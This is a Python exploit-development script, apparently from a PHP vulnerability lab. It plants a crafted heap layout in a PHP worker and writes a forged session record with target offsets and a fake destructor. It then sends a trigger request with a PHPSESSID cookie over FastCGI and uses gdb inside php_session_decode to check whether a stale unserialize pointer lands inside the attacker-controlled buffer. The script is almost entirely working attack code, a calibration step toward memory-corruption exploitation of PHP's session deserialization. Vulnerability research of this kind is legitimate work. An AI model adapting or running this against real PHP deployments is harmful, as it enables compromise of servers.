#!/usr/bin/env python3
"""Does the stale P land inside the session record buffer?

usage: cov.py <version> <transport:get|mp> <total> [pad]

Fresh worker -> probe -> plant -> state -> zero-payload record of <total> bytes
-> one trigger request under gdb.  Prints P, B0, X (buffer base), the buffer
range and whether P is covered.  A zero payload makes the decode harmless, so
the worker survives and the addresses are the real ones.
"""
import json, os, re, sys, time
R = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(R, 'scripts'))
import lab

GDB = '''set pagination off
set confirm off
handle SIGCHLD nostop noprint pass
handle SIGPIPE nostop noprint pass
set $nh = 0
break php_session_decode
commands
silent
set $nh = $nh + 1
printf "DECODE n=%d data=%p val=%p len=%lu level=%ld bg=%p\\n", $nh, $rdi, ((zend_string*)$rdi)->val, ((zend_string*)$rdi)->len, basic_globals.unserialize.level, basic_globals.unserialize.data
set $p = basic_globals.unserialize.data
if $p
  printf "PFIELDS %p %p %p %p %p\\n", $p, *(void**)$p, *(void**)($p+8), *(void**)($p+16), *(void**)($p+24)
end
if $nh >= 2
  detach
  quit
end
continue
end
continue
printf "STOPPED rip=%p\\n", $rip
bt
detach
quit
'''


def main():
    v, transport, total = sys.argv[1], sys.argv[2], int(sys.argv[3])
    pad = int(sys.argv[4]) if len(sys.argv) > 4 else 0
    shape = int(sys.argv[5]) if len(sys.argv) > 5 else 0
    s = lab.info(v)
    labd = lab.labdir(v)
    open(os.path.join(labd, 'gdb', 'cov.gdb'), 'w').write(GDB)
    master = lab.rd(os.path.join(labd, 'run', 'master.pid'))
    child = lab.rd(os.path.join(labd, 'run', 'child.pid'))
    if not master or not lab.alive(master):
        lab.stop(v)
        time.sleep(0.3)
        master, child = lab.start(v)
    elif child and lab.alive(child):
        lab.kill_wait(master, child)
    newchild = lab.wait_child(master, exclude=child)
    assert newchild, 'no worker'
    lab.note_child(v, newchild)
    time.sleep(0.2)
    st = lab.drv(v, 'probe')
    pid = int(re.search(r'PID=(\d+)', st).group(1))
    assert pid == newchild, (pid, newchild)
    out = lab.drv(v, 'plant', str(pad), str(shape), env={'PLANT_PAYLOAD': s['plant_payload']})
    print('plant:', out.replace('\n', ' ')[:120])
    txt, _ = lab.gdb(v, 'state.gdb', phase='cov_state.txt')
    P = int(lab.kv(txt, 'BG_DATA'), 16)
    B0 = int(lab.kv(txt, 'P_LAST_DTOR'), 16)
    print('P=%#x B0=%#x level=%s used=%s' % (
        P, B0, lab.kv(txt, 'BG_LEVEL'), lab.kv(txt, 'DTOR_USED')))
    sid = 'c' + v.replace('.', '')
    meta = os.path.join(labd, 'phase', 'cov_mkrec_%s.json' % sid)
    cmd = [sys.executable, os.path.join(labd, 'scripts', 'mkrec.py'),
           '--out', os.path.join(labd, 'sessions', 'sess_' + sid),
           '--total', str(total), '--key-len', str(s['key_len']),
           '--arg1-off', s['arg1_off'], '--type-off', s['type_off'],
           '--target', s['decode2'], '--zero-payload', '--meta', meta]
    if s['old_dtor']:
        cmd.append('--old-dtor')
    import subprocess
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        raise SystemExit('mkrec: %s %s' % (r.stdout[-800:], r.stderr[-800:]))
    print('rec', json.load(open(meta))['total'])
    if transport == 'mp':
        act = lambda: lab.drv(v, 'calib', sid)
    else:
        sys.path.insert(0, os.path.join(labd, 'scripts'))
        import fcgi
        fcgi.init(os.path.join(labd, 'www'), port=s['port'])
        act = lambda: fcgi.request('trig.php', b'', None, cookie='PHPSESSID=' + sid,
                                   timeout=30, extra_params={'REQUEST_METHOD': 'GET',
                                                             'CONTENT_LENGTH': '0'})
    txt, _ = lab.gdb(v, 'cov.gdb', act, phase='cov_gdb.txt', timeout=90)
    print('\n'.join(l for l in txt.splitlines() if re.match(r'^(DECODE|PFIELDS|STOPPED|Program)', l)))
    m = re.search(r'^DECODE n=1 data=(\S+) val=(\S+) len=(\d+)', txt, re.M)
    res = {'version': v, 'transport': transport, 'total': total, 'pad': pad, 'shape': shape,
           'P': hex(P), 'B0': hex(B0), 'worker': newchild}
    if m:
        X = int(m.group(1), 16)
        val = int(m.group(2), 16)
        ln = int(m.group(3))
        res.update({'X': hex(X), 'val': hex(val), 'len': ln,
                    'p_off': hex(P - val), 'covered': val <= P and P + 40 <= val + ln})
    print('RESULT', json.dumps(res))
    json.dump(res, open(os.path.join(labd, 'phase', 'cov_%s_%d_%d_%d.json' % (
        transport, total, pad, shape)), 'w'), indent=1)


if __name__ == '__main__':
    main()
